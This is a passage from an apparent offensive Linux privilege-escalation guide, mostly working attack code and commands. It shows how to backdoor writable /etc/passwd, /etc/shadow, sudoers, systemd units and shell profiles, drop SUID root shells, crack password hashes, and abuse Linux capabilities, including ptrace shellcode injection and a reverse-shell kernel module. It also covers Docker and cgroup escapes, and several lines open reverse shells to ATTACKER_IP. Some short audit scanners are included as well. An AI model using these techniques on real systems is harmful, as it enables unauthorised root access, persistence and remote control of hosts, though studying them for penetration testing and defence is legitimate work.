    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }
    
    // Redirect /etc/shadow to fake file
    if (strcmp(pathname, "/etc/shadow") == 0) {
        return original_open("/tmp/fake_shadow", flags);
    }
    
    return original_open(pathname, flags);
}
```

Compile and use:

```bash
gcc -fPIC -shared -o /tmp/interpose.so symbol_interpose.c -ldl

# Create fake shadow file
echo 'root:$6$salt$hashedpass:18000:0:99999:7:::' > /tmp/fake_shadow

# Use against privilege checking programs
LD_PRELOAD=/tmp/interpose.so /usr/local/bin/priv_checker
```

### Weak File Permissions

Weak file permissions on critical system files enable privilege escalation through direct modification, replacement, or exploitation of misconfigured access controls.

**Critical Files to Check**

```bash
# Essential system files
CRITICAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/sudoers"
    "/etc/sudoers.d/*"
    "/etc/crontab"
    "/etc/cron.d/*"
    "/root/.ssh/authorized_keys"
    "/etc/ssh/sshd_config"
    "/etc/profile"
    "/etc/bash.bashrc"
    "/root/.bashrc"
)

# Check permissions
for file in "${CRITICAL_FILES[@]}"; do
    [ -e "$file" ] && ls -la "$file"
done
```

**Automated Weak Permission Scanner**

```bash
#!/bin/bash
# weak_perms_scanner.sh

echo "[*] Scanning for weak file permissions..."

# Check /etc/passwd writability
if [ -w /etc/passwd ]; then
    echo "[!!!] CRITICAL: /etc/passwd is writable!"
fi

# Check /etc/shadow readability/writability
if [ -r /etc/shadow ]; then
    echo "[!!!] CRITICAL: /etc/shadow is readable!"
fi
if [ -w /etc/shadow ]; then
    echo "[!!!] CRITICAL: /etc/shadow is writable!"
fi

# Check /etc/sudoers permissions
if [ -w /etc/sudoers ]; then
    echo "[!!!] CRITICAL: /etc/sudoers is writable!"
fi

# Check sudoers.d directory
if [ -w /etc/sudoers.d ]; then
    echo "[!!] /etc/sudoers.d directory is writable!"
fi

# Find world-writable files owned by root
echo "[*] Finding world-writable root-owned files..."
find / -type f -perm -0002 -user root 2>/dev/null | while read file; do
    echo "[!] World-writable root file: $file"
done

# Find SUID/SGID files with weak permissions
echo "[*] Finding SUID/SGID files with group/other write..."
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | while read file; do
    perms=$(stat -c "%a" "$file")
    if [[ $perms == *[2367]* ]]; then
        echo "[!!] Weak SUID/SGID permissions: $file ($perms)"
    fi
done

# Check for writable directories in root's PATH
echo "[*] Checking root's PATH for writable directories..."
grep "^root:" /etc/passwd | cut -d: -f6 | while read root_home; do
    [ -f "$root_home/.bashrc" ] && grep "^PATH=" "$root_home/.bashrc" | \
        cut -d= -f2 | tr ':' '\n' | while read dir; do
            [ -d "$dir" ] && [ -w "$dir" ] && \
                echo "[!!] Writable directory in root PATH: $dir"
        done
done

# Check SSH configurations
if [ -r /etc/ssh/sshd_config ]; then
    echo "[*] Checking SSH configuration..."
    grep -E "^PermitRootLogin|^PasswordAuthentication|^PubkeyAuthentication" \
        /etc/ssh/sshd_config
fi

# Check for writable .service files
echo "[*] Checking systemd service files..."
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null | \
    while read service; do
        echo "[!!] Writable service file: $service"
    done
```

**Exploiting Writable /etc/passwd**

When /etc/passwd is writable, create new root user:

```bash
# Verify writability
ls -la /etc/passwd
# Output: -rw-rw-r-- 1 root users 1234 Oct 10 10:00 /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qJH8TwMVYXQOIoFTa.z/m.

# Add new root user
echo 'newroot:$1$salt$qJH8TwMVYXQOIoFTa.z/m.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su newroot
# Enter password: password123

# Verify root access
id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

Alternative approach without password:

```bash
# Add root user with no password (requires empty password allowed)
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to user
su root2
```

**Exploiting Readable /etc/shadow**

When /etc/shadow is readable

```bash
# Verify readability
ls -la /etc/shadow
# Output: -rw-r--r-- 1 root shadow 1045 Oct 10 10:00 /etc/shadow

# Extract password hashes
cat /etc/shadow
# Output: root:$6$random$hash...:18000:0:99999:7:::

# Copy hashes to local machine for cracking
grep -v "^#\|^$\|:\*:\|:!:" /etc/shadow > shadow_hashes.txt

# Identify hash types
hashid '$6$random$hash...'
# Output: SHA-512 Crypt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt

# Alternative: hashcat
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show shadow_hashes.txt
# Output: root:password123:18000:0:99999:7:::
```

**Exploiting Writable /etc/shadow**

When /etc/shadow is writable, replace password hash directly:

```bash
# Verify writability
[ -w /etc/shadow ] && echo "Writable!"

# Generate new password hash
mkpasswd -m sha-512 newpassword
# Output: $6$newsalt$newhash...

# Backup original shadow file
cp /etc/shadow /tmp/shadow.bak

# Replace root's password hash
sed -i 's|^root:[^:]*:|root:$6$newsalt$newhash...:|' /etc/shadow

# Verify change
grep "^root:" /etc/shadow

# Authenticate as root
su root
# Enter password: newpassword

# Alternative: Remove password entirely (allow empty password)
sed -i 's|^root:[^:]*:|root::|' /etc/shadow
su root  # Press Enter when prompted for password
```

**Exploiting Writable /etc/sudoers**

Direct modification of sudoers file:

```bash
# Check if writable
ls -la /etc/sudoers
# Output: -rw-rw-r-- 1 root root 755 Oct 10 10:00 /etc/sudoers

# Add current user to sudoers with NOPASSWD
echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Verify and escalate
sudo -l
# Output: User may run: (ALL) NOPASSWD: ALL

sudo su
# Now root
```

**Exploiting Writable /etc/sudoers.d/**

```bash
# Check directory permissions
ls -lad /etc/sudoers.d/
# Output: drwxrwxr-x 2 root root 4096 Oct 10 10:00 /etc/sudoers.d/

# Create new sudoers configuration
cat > /etc/sudoers.d/privesc << EOF
$USER ALL=(ALL) NOPASSWD:ALL
EOF

# Set proper permissions (required for sudo to read it)
chmod 440 /etc/sudoers.d/privesc

# Escalate privileges
sudo su
```

**Exploiting Writable Service Files**

Systemd service files with weak permissions:

```bash
# Find writable service files
find /etc/systemd/system /lib/systemd/system -name "*.service" -writable 2>/dev/null

# Example: Writable service file
ls -la /etc/systemd/system/custom.service
# Output: -rw-rw-r-- 1 root users 256 Oct 10 10:00 custom.service

# Backup original service
cp /etc/systemd/system/custom.service /tmp/custom.service.bak

# Modify service to execute malicious command
cat > /etc/systemd/system/custom.service << 'EOF'
[Unit]
Description=Custom Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd
systemctl daemon-reload

# Restart service
systemctl restart custom.service

# Execute root shell
/tmp/rootbash -p
```

**Exploiting Writable /etc/profile or /etc/bash.bashrc**

System-wide shell initialization files:

```bash
# Check permissions
ls -la /etc/profile /etc/bash.bashrc
# Output: -rw-rw-r-- 1 root root 575 Oct 10 10:00 /etc/profile

# Add backdoor command to execute when root logs in
cat >> /etc/profile << 'EOF'

# Backdoor
if [ $UID -eq 0 ]; then
    cp /bin/bash /tmp/.rootshell 2>/dev/null
    chmod +xs /tmp/.rootshell 2>/dev/null
fi
EOF

# Wait for root to login or trigger profile reload
# Then execute created shell
/tmp/.rootshell -p
```

**Exploiting Writable SSH Configuration**

```bash
# Check SSH configuration permissions
ls -la /etc/ssh/sshd_config
# Output: -rw-rw-r-- 1 root root 3241 Oct 10 10:00 /etc/ssh/sshd_config

# Enable dangerous SSH settings
cat >> /etc/ssh/sshd_config << 'EOF'
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
PermitEmptyPasswords yes
EOF

# Restart SSH service (may require privileges)
sudo systemctl restart sshd

# Or if SSH directory is writable
ls -lad ~/.ssh /root/.ssh
# Output: drwxrwxrwx 2 user user 4096 Oct 10 10:00 /root/.ssh

# Add SSH key to root's authorized_keys
mkdir -p /root/.ssh
ssh-keygen -t rsa -f /tmp/rootkey -N ""
cat /tmp/rootkey.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Connect as root
ssh -i /tmp/rootkey root@localhost
```

**Exploiting Writable Init Scripts**

Legacy SysV init scripts:

```bash
# Find writable init scripts
find /etc/init.d -type f -writable 2>/dev/null

# Example: Writable init script
ls -la /etc/init.d/custom-service
# Output: -rwxrwxr-x 1 root users 512 Oct 10 10:00 custom-service

# Add malicious code to init script
cat >> /etc/init.d/custom-service << 'EOF'

# Backdoor
cp /bin/bash /tmp/.rootbash 2>/dev/null
chmod +xs /tmp/.rootbash 2>/dev/null
EOF

# Restart service
sudo service custom-service restart

# Execute root shell
/tmp/.rootbash -p
```

**Exploiting Writable Library Directories**

```bash
# Find library directories with weak permissions
find /lib /usr/lib /usr/local/lib -type d -writable 2>/dev/null

# Example: Writable library directory
ls -lad /usr/local/lib
# Output: drwxrwxrwx 2 root root 4096 Oct 10 10:00 /usr/local/lib

# Create malicious library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash");
}
EOF

gcc -fPIC -shared -o /usr/local/lib/libevil.so /tmp/evil.c

# Wait for system program to load libraries from this directory
# Or use LD_LIBRARY_PATH to force loading
LD_LIBRARY_PATH=/usr/local/lib /usr/local/bin/some_program
```

**Exploiting Writable .bashrc or .profile of Privileged Users**

```bash
# Find writable shell initialization files for other users
find /home /root -name ".bashrc" -o -name ".profile" -writable 2>/dev/null

# Example: Root's .bashrc is writable
ls -la /root/.bashrc
# Output: -rw-rw-r-- 1 root users 3106 Oct 10 10:00 /root/.bashrc

# Add backdoor command
cat >> /root/.bashrc << 'EOF'

# Backdoor - create SUID shell when root logs in
if [ $UID -eq 0 ]; then
    cp /bin/bash /tmp/.emergency 2>/dev/null
    chmod +xs /tmp/.emergency 2>/dev/null
fi
EOF

# Wait for root to login
# Then execute created shell
/tmp/.emergency -p
```

**Exploiting Writable Backup Scripts**

```bash
# Find backup scripts owned by root
find / -type f -name "*backup*" -user root 2>/dev/null

# Check if any are writable
find / -type f -name "*backup*" -user root -writable 2>/dev/null

# Example: Writable backup script
ls -la /opt/backup_script.sh
# Output: -rwxrwxr-x 1 root root 256 Oct 10 10:00 backup_script.sh

# Verify it runs as root (check cron or systemd timer)
grep -r "backup_script.sh" /etc/cron* /etc/systemd/system/

# Add malicious command
cat >> /opt/backup_script.sh << 'EOF'

# Backdoor
cp /bin/bash /tmp/.rootaccess
chmod +xs /tmp/.rootaccess
EOF

# Wait for script execution
watch -n 1 'ls -la /tmp/.rootaccess 2>/dev/null'
```

**Exploiting Writable Configuration Files**

Applications that run with elevated privileges:

```bash
# Find configuration files for root-owned processes
ps aux | grep "^root" | awk '{print $11}' | sort -u | while read proc; do
    # Find associated config files
    strings "$proc" 2>/dev/null | grep -E "\.conf|\.cfg|\.ini" | while read conf; do
        [ -f "$conf" ] && [ -w "$conf" ] && echo "[!] Writable config: $conf for $proc"
    done
done

# Example: MySQL configuration writable
ls -la /etc/mysql/my.cnf
# Output: -rw-rw-r-- 1 root mysql 682 Oct 10 10:00 my.cnf

# Add malicious plugin or command execution
cat >> /etc/mysql/my.cnf << 'EOF'

[mysqld]
# Load malicious UDF library
plugin_dir=/tmp/
secure_file_priv=""
EOF

# Create malicious plugin
# Then restart MySQL service
```

**Comprehensive Permission Audit Script**

```bash
#!/bin/bash
# comprehensive_perms_audit.sh

RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "[*] Comprehensive File Permission Audit"
echo "========================================"

# Critical system files
echo -e "\n${YELLOW}[*] Checking critical system files...${NC}"
CRITICAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/sudoers"
    "/etc/ssh/sshd_config"
    "/etc/crontab"
)

for file in "${CRITICAL_FILES[@]}"; do
    if [ -f "$file" ]; then
        perms=$(stat -c "%a %U:%G" "$file")
        
        if [ -w "$file" ]; then
            echo -e "${RED}[!!!] WRITABLE: $file ($perms)${NC}"
        elif [ -r "$file" ] && [[ "$file" == *"shadow"* ]]; then
            echo -e "${RED}[!!] READABLE: $file ($perms)${NC}"
        fi
    fi
done

# Writable directories in PATH
echo -e "\n${YELLOW}[*] Checking PATH directories...${NC}"
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo -e "${RED}[!!] Writable PATH directory: $dir${NC}"
    fi
done

# SUID/SGID files with weak permissions
echo -e "\n${YELLOW}[*] Checking SUID/SGID files...${NC}"
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | head -20 | while read file; do
    perms=$(stat -c "%a" "$file")
    owner=$(stat -c "%U:%G" "$file")
    
    # Check for group/other write permissions on SUID files
    if [[ $perms =~ [2367]$ ]]; then
        echo -e "${RED}[!!!] Weak SUID/SGID: $file ($perms $owner)${NC}"
    fi
    
    # Check for writable SUID files
    if [ -w "$file" ]; then
        echo -e "${RED}[!!!] WRITABLE SUID: $file${NC}"
    fi
done

# World-writable files in system directories
echo -e "\n${YELLOW}[*] Checking world-writable files...${NC}"
find /etc /usr/bin /usr/sbin /usr/local/bin -type f -perm -0002 2>/dev/null | head -10 | while read file; do
    echo -e "${RED}[!!] World-writable: $file${NC}"
done

# Writable systemd service files
echo -e "\n${YELLOW}[*] Checking systemd services...${NC}"
find /etc/systemd/system /lib/systemd/system -name "*.service" -writable 2>/dev/null | while read service; do
    echo -e "${RED}[!!] Writable service: $service${NC}"
done

# Writable script files executed by root
echo -e "\n${YELLOW}[*] Checking root-executed scripts...${NC}"
find /usr/local/bin /opt -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" \) -writable 2>/dev/null | while read script; do
    # Check if appears in cron
    if grep -qr "$(basename $script)" /etc/cron* 2>/dev/null; then
        echo -e "${RED}[!!] Writable cron script: $script${NC}"
    else
        echo -e "${YELLOW}[!] Writable script: $script${NC}"
    fi
done

# Files with capabilities
echo -e "\n${YELLOW}[*] Checking file capabilities...${NC}"
getcap -r / 2>/dev/null | head -10 | while read line; do
    file=$(echo "$line" | awk '{print $1}')
    if [ -w "$file" ]; then
        echo -e "${RED}[!!] Writable file with capabilities: $line${NC}"
    fi
done

# Writable home directories of privileged users
echo -e "\n${YELLOW}[*] Checking privileged user home directories...${NC}"
awk -F: '$3 == 0 || $3 < 1000 {print $6}' /etc/passwd | while read homedir; do
    if [ -d "$homedir" ]; then
        if [ -w "$homedir/.bashrc" ] 2>/dev/null; then
            echo -e "${RED}[!!] Writable .bashrc: $homedir/.bashrc${NC}"
        fi
        if [ -w "$homedir/.profile" ] 2>/dev/null; then
            echo -e "${RED}[!!] Writable .profile: $homedir/.profile${NC}"
        fi
        if [ -w "$homedir/.ssh/authorized_keys" ] 2>/dev/null; then
            echo -e "${RED}[!!] Writable authorized_keys: $homedir/.ssh/authorized_keys${NC}"
        fi
    fi
done

# Writable log files
echo -e "\n${YELLOW}[*] Checking log files...${NC}"
find /var/log -type f -writable 2>/dev/null | head -10 | while read log; do
    echo -e "${YELLOW}[!] Writable log file: $log${NC}"
done

echo -e "\n[*] Audit complete"
```

**Exploiting Incorrect Ownership**

Files owned by unprivileged users but executed with privileges:

```bash
# Find files not owned by root but in privileged locations
find /usr/local/bin /opt -type f ! -user root -executable 2>/dev/null

# Check if any are called by root processes or cron
find /usr/local/bin /opt -type f ! -user root | while read file; do
    if grep -qr "$(basename $file)" /etc/cron* 2>/dev/null; then
        echo "[!!] Non-root owned file in cron: $file"
        ls -la "$file"
    fi
done

# Exploit by modifying the file
cat > /usr/local/bin/vulnerable_script.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chmod +xs /tmp/rootshell
EOF
```

**Exploiting Sticky Bit Misconfiguration**

```bash
# Find directories with sticky bit but writable by group/others
find / -type d -perm -1000 2>/dev/null | while read dir; do
    perms=$(stat -c "%a" "$dir")
    
    # Check if group or others can write
    if [[ $perms =~ ^1[0-9][2367]$ ]] || [[ $perms =~ ^1[0-9][0-9][2367]$ ]]; then
        echo "[!] Sticky bit directory with write perms: $dir ($perms)"
    fi
done

# Exploiting writable sticky bit directories
# Even with sticky bit, may be able to replace files in certain scenarios
```

**Exploiting NFS Exports with no_root_squash**

```bash
# Check for NFS exports (requires /etc/exports access)
cat /etc/exports
# Look for: /shared *(rw,no_root_squash)

# From attacker machine, mount NFS share
showmount -e target_ip
mkdir /tmp/nfs_mount
mount -t nfs target_ip:/shared /tmp/nfs_mount

# Create SUID binary on NFS share
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +xs /tmp/nfs_mount/rootbash

# On target machine, execute
/shared/rootbash -p
```

**Exploiting Docker Socket Permissions**

```bash
# Check docker socket permissions
ls -la /var/run/docker.sock
# Output: srw-rw---- 1 root docker 0 Oct 10 10:00 /var/run/docker.sock

# If current user is in docker group or socket is world-writable
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Alternative: Create privileged container
docker run -v /:/hostfs --privileged -it ubuntu bash
chroot /hostfs /bin/bash
```

### Related Topics

For complete Linux privilege escalation mastery, explore these critical related areas:

- **Kernel Exploits**: CVE-specific kernel vulnerabilities, dirty cow variants, memory corruption exploits
- **Capabilities Exploitation**: Linux capabilities abuse (CAP_SYS_ADMIN, CAP_DAC_OVERRIDE), capability-based privilege escalation
- **Container Escapes**: Docker/LXC breakout techniques, Kubernetes privilege escalation
- **SUDO Misconfigurations**: GTFOBins exploitation, sudo token hijacking, CVE-based sudo bypasses

---

### Capabilities Exploitation

#### Understanding Linux Capabilities

Linux capabilities divide root privileges into distinct units that can be independently assigned to processes or binaries. This allows fine-grained privilege management without full root access.

**Key capability categories:**

- `CAP_CHOWN` - Change file ownership
- `CAP_DAC_OVERRIDE` - Bypass file read/write/execute permission checks
- `CAP_DAC_READ_SEARCH` - Bypass file read permission and directory execute checks
- `CAP_FOWNER` - Bypass permission checks on operations requiring file owner UID match
- `CAP_SETUID` - Make arbitrary manipulations of process UIDs
- `CAP_SETGID` - Make arbitrary manipulations of process GIDs
- `CAP_NET_BIND_SERVICE` - Bind to ports below 1024
- `CAP_NET_RAW` - Use RAW and PACKET sockets
- `CAP_SYS_ADMIN` - Wide range of system administration operations
- `CAP_SYS_PTRACE` - Trace arbitrary processes using ptrace
- `CAP_SYS_MODULE` - Load and unload kernel modules

#### Enumerating Capabilities

```bash
# List capabilities of specific binary
getcap /path/to/binary

# Search all files for capabilities (comprehensive)
getcap -r / 2>/dev/null

# Search common binary directories
getcap -r /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin 2>/dev/null

# Check capabilities of running process
cat /proc/[PID]/status | grep Cap
getpcaps [PID]

# Check current process capabilities
capsh --print

# Decode capability hex values
capsh --decode=0000003fffffffff
```

**Output format:**

```
/usr/bin/python3.8 = cap_setuid+ep
```

- `=` assigns capabilities
- `+` adds capabilities
- `e` = effective (capability is active)
- `p` = permitted (capability can be activated)
- `i` = inheritable (capability can be inherited by child processes)

#### CAP_SETUID Exploitation

**Most direct privilege escalation capability.** Allows changing process UID to 0 (root).

```bash
# Python exploitation
/path/to/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Python3 exploitation
/path/to/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl exploitation
/path/to/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# Ruby exploitation
/path/to/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# PHP exploitation (if cap_setuid)
/path/to/php -r "posix_setuid(0); system('/bin/bash');"
```

**Node.js exploitation:**

```javascript
// Save as exploit.js
require('child_process').exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

// Execute
/path/to/node exploit.js
/tmp/rootbash -p
```

#### CAP_SETGID Exploitation

Similar to CAP_SETUID but for group ID manipulation.

```bash
# Python - change to shadow group (GID typically 42)
python -c 'import os; os.setgid(42); os.system("cat /etc/shadow")'

# Create setgid shell
python -c 'import os; os.setgid(0); os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")'
/tmp/bash -p
```

#### CAP_DAC_READ_SEARCH Exploitation

Bypass file read permission checks - read any file regardless of permissions.

```bash
# Python script to read /etc/shadow
python3 << EOF
import os
os.setuid(os.getuid())
with open('/etc/shadow', 'r') as f:
    print(f.read())
EOF

# Read SSH private keys
python3 -c 'print(open("/root/.ssh/id_rsa").read())'

# Alternative: use tar to read files
tar -czf /tmp/root.tar.gz /root/.ssh/
tar -xzf /tmp/root.tar.gz
```

**Node.js approach:**

```javascript
// Save as read.js
const fs = require('fs');
console.log(fs.readFileSync('/etc/shadow', 'utf8'));

// Execute
/path/to/node read.js
```

#### CAP_DAC_OVERRIDE Exploitation

Bypass all file permission checks (read, write, execute).

```bash
# Write to /etc/passwd
python3 << EOF
with open('/etc/passwd', 'a') as f:
    f.write('hacker:$6$salt$hash:0:0:root:/root:/bin/bash\n')
EOF

# Overwrite /etc/shadow
python3 -c "open('/etc/shadow','w').write('root::0:0:99999:7:::\n')"

# Add SSH key to root
python3 << EOF
import os
os.makedirs('/root/.ssh', exist_ok=True)
with open('/root/.ssh/authorized_keys', 'a') as f:
    f.write('ssh-rsa AAAAB3... attacker@host\n')
EOF
```

#### CAP_SYS_ADMIN Exploitation

Extremely powerful capability with multiple exploitation vectors.

**Mount namespace abuse:**

```bash
# Create mount namespace and mount privileged filesystem
unshare -m bash
mkdir /tmp/mnt
mount -t tmpfs tmpfs /tmp/mnt
```

**Abuse via kernel operations:**

```bash
# If combined with CAP_SYS_MODULE
# Load malicious kernel module
insmod /path/to/rootkit.ko
```

[Inference] CAP_SYS_ADMIN enables numerous operations; specific exploitability depends on other system configurations and available capabilities.

#### CAP_SYS_PTRACE Exploitation

Allows attaching to and controlling other processes.

**Inject shellcode into root process:**

```bash
# Find root process
ps aux | grep "^root" | head -1

# Use ptrace injection tool
# Example with custom C program
gcc -o inject inject.c
./inject [ROOT_PID]
```

**Inject into process C code example:**

```c
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/syscall.h>

// Shellcode to setuid(0) and execute shell
unsigned char shellcode[] = 
    "\x48\x31\xff\x48\x89\xfe\x48\x89\xf2\x48\x89\xd0\x48\x83\xc0\x69\x0f\x05";

int main(int argc, char *argv[]) {
    pid_t target = atoi(argv[1]);
    struct user_regs_struct regs;
    
    ptrace(PTRACE_ATTACH, target, NULL, NULL);
    wait(NULL);
    
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    ptrace(PTRACE_POKETEXT, target, regs.rip, shellcode);
    regs.rip = regs.rip;
    ptrace(PTRACE_SETREGS, target, NULL, &regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    
    return 0;
}
```

[Unverified] Shellcode and ptrace injection techniques vary by architecture and kernel version; this is a simplified example.

#### CAP_SYS_MODULE Exploitation

Load kernel modules to gain root access.

**Create reverse shell kernel module:**

```c
// reverse_shell.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

static int __init reverse_shell_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
MODULE_LICENSE("GPL");
```

**Makefile:**

```makefile
obj-m += reverse_shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**Compilation and loading:**

```bash
# Compile on target or matching kernel version
make

# Load module
insmod reverse_shell.ko

# Verify loaded
lsmod | grep reverse_shell

# Remove module
rmmod reverse_shell
```

[Unverified] Kernel module compilation requires matching kernel headers; functionality depends on kernel security features like module signing.

#### CAP_NET_RAW Exploitation

Create raw network packets; useful for network-based attacks.

```bash
# If combined with other capabilities
# Can be used for ARP spoofing, packet injection, etc.

# Example: Ping using raw sockets
python3 << EOF
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
packet = struct.pack('bbHHh', 8, 0, 0, 1, 1)  # ICMP echo request
s.sendto(packet, ('127.0.0.1', 0))
EOF
```

[Inference] CAP_NET_RAW alone typically doesn't provide direct privilege escalation but may enable network attacks if combined with other vulnerabilities.

#### Capability Abuse via File Manipulation

**Adding capabilities to binaries:**

```bash
# If you can write to a directory in PATH
# Copy bash and add cap_setuid
cp /bin/bash /tmp/bash
setcap cap_setuid+ep /tmp/bash
/tmp/bash -c "whoami"  # May show root depending on context
```

**Removing capabilities:**

```bash
# Remove specific capability
setcap -r /path/to/binary

# Check effective UID propagation
/path/to/binary -c "id"
```

### Docker Escape

#### Detecting Docker Environment

```bash
# Check for .dockerenv file
ls -la /.dockerenv

# Check cgroup for docker
cat /proc/1/cgroup | grep -i docker

# Check mounted filesystems
mount | grep -i docker
df -h | grep overlay

# Check for docker.sock
ls -la /var/run/docker.sock

# Check if running as PID 1
ps aux | head -2

# Check capabilities (containers often have limited caps)
capsh --print

# Check for container environment variables
env | grep -i container
```

#### Docker Socket Exploitation

**If `/var/run/docker.sock` is mounted inside container** - direct host compromise.

```bash
# Verify socket access
ls -la /var/run/docker.sock

# Check if docker client available
which docker

# If docker not installed, download static binary
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz -O /tmp/docker.tgz
tar -xzf /tmp/docker.tgz -C /tmp/
export PATH=/tmp/docker:$PATH
```

**Mount host filesystem:**

```bash
# List docker images
docker images

# Run privileged container with host root mounted
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# Alternative: Use existing image
docker run -v /:/mnt -it alpine chroot /mnt bash

# If no suitable image, use minimal
docker run -v /:/hostfs --rm -it alpine sh
chroot /hostfs /bin/bash

# Add SSH key to host root
echo "ssh-rsa AAAAB3..." >> /hostfs/root/.ssh/authorized_keys

# Create SUID shell on host
cp /hostfs/bin/bash /hostfs/tmp/rootbash
chmod +s /hostfs/tmp/rootbash
```

**Direct command execution on host:**

```bash
# Using docker exec-like functionality
docker run -v /:/hostfs --privileged alpine nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Create cron job on host
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /hostfs/etc/crontab
```

**Using curl if docker binary unavailable:**

```bash
# Docker API via socket
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

# Create container with host filesystem
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/hostfs"],"Privileged":true}' \
  http://localhost/containers/create

# Start container (replace CONTAINER_ID)
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/CONTAINER_ID/start
```

#### Privileged Container Escape

**If container runs with `--privileged` flag:**

```bash
# Check if privileged
capsh --print | grep cap_sys_admin

# Check device access
ls -la /dev

# Mount host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# If unsure of disk
fdisk -l
lsblk

# Access host filesystem
chroot /mnt/host /bin/bash

# Alternative: Create device node and mount
mknod /dev/sda1 b 8 1
mkdir /hostfs
mount /dev/sda1 /hostfs
```

**Kernel exploitation from privileged container:**

```bash
# Release agent abuse (classic technique)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp

# Create payload script on host
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /cmd
chmod +x /cmd

# Trigger via release_agent
echo /cmd > /tmp/cgrp/release_agent
echo $$ > /tmp/cgrp/cgroup.procs
```

**Detailed release_agent technique:**

```bash
# Create cgroup and get host path
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w
echo 1 > $d/w/notify_on_release

# Get host path of container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Create payload on host filesystem
echo "$host_path/exploit" > $d/release_agent

# Create exploit script
cat > /exploit << EOF
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /exploit

# Trigger release agent
sh -c "echo \$\$ > $d/w/cgroup.procs"
```

[Unverified] Release agent technique requires specific kernel and cgroup configurations; may not work on all systems.

#### Dangerous Capabilities in Containers

**CAP_SYS_ADMIN in container:**

```bash
# Check for CAP_SYS_ADMIN
capsh --print | grep sys_admin

# Mount operations escape
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Kernel module loading (if available)
insmod /path/to/module.ko
```

**CAP_SYS_PTRACE in container:**

```bash
# Find processes on host visible from container
ps aux

# Inject into host process (if visible)
gdb -p [HOST_PID]
(gdb) call system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

**CAP_SYS_MODULE in container:**

```bash
# Load kernel module to escape
# See CAP_SYS_MODULE section above
```

#### Container Misconfiguration Exploitation

**Exposed Docker daemon:**

```bash
# If DOCKER_HOST environment variable set
echo $DOCKER_HOST

# Connect to remote Docker daemon
docker -H tcp://TARGET_IP:2375 ps
docker -H tcp://TARGET_IP:2375 run -v /:/hostfs -it alpine chroot /hostfs bash
```

**Writable docker group socket:**

